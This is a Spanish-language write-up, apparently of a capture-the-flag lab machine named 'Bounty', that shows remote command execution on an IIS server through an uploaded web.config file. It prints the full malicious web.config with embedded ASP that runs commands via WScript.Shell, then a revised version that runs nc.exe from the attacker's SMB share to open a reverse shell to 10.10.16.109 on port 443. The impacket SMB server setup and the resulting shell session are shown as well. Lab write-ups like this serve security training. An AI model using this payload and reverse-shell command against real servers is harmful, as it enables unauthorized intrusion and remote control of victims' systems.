# Ejecución remota de comandos a través de un archivo web.config

Mediante la creación de un archivo `web.config` especialmente diseñado, se detectó que es posible ejecutar comandos en el servidor remoto.

A continuación, se proporciona el contenido del archivo `web.config`:

```bash
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
   <appSettings>
</appSettings>
</configuration>
<!–-
<% Response.write("-"&"->")
Response.write("<pre>")
Set wShell1 = CreateObject("WScript.Shell")
Set cmd1 = wShell1.Exec("cmd.exe /c whoami")
output1 = cmd1.StdOut.Readall()
set cmd1 = nothing: Set wShell1 = nothing
Response.write(output1)
Response.write("</pre><!-"&"-") %>
-–>
```

La idea de la definición de este script es que tras la subida del archivo al servidor, se ejecute esta sentencia a nivel de sistema:

```bash
cmd.exe /c whoami
```

Cabe destacar que para ello, es necesario apuntar a la siguiente ruta del servidor web:

* http://10.10.10.93/uploadedFiles/web.config

Una vez ingresado a la URL anteriormente citada, se obtuvo la siguiente respuesta del lado del servidor:

```bash
bounty\\merlin
```

Con el objetivo de ganar acceso al sistema, se compartió un recurso a nivel de red con `impacket-smbserver` que ofreciera el binario `nc.exe`:

```bash
impacket-smbserver smbFolder $(pwd) -smb2support
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation
                                              
[*] Config file parsed                     
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed                                                                                                                                                                     
[*] Config file parsed                                                                                                                                                                     
[*] Config file parsed                        
```

Para ello, fue necesario retocar el archivo `web.config`, de forma que se conectara al recurso compartido a nivel de red del atacante para ejecutar dicho binario y ganar acceso en consecuencia al sistema mediante una conexión por TCP:

```bash
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
   <appSettings>
</appSettings>
</configuration>
<!–-
<% Response.write("-"&"->")
Response.write("<pre>")
Set wShell1 = CreateObject("WScript.Shell")
Set cmd1 = wShell1.Exec("cmd.exe /c \\10.10.16.109\smbFolder\nc.exe -e cmd 10.10.16.109 443")
output1 = cmd1.StdOut.Readall()
set cmd1 = nothing: Set wShell1 = nothing
Response.write(output1)
Response.write("</pre><!-"&"-") %>
-–>
```

En este punto, tras acceder a la dirección URL `http://10.10.10.93/uploadedFiles/web.config`, se consiguió ganar acceso al sistema:

```bash
rlwrap nc -nlvp 443
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.93.
Ncat: Connection from 10.10.10.93:49160.
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

c:\windows\system32\inetsrv> whoami

bounty\merlin

c:\windows\system32\inetsrv> ipconfig

Windows IP Configuration


Ethernet adapter Local Area Connection:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 10.10.10.93
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.10.10.2

Tunnel adapter isatap.{27C3F487-28AC-4CE6-AE3A-1F23518EF7A7}:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : 

c:\windows\system32\inetsrv> hostname

bounty

c:\windows\system32\inetsrv>
```
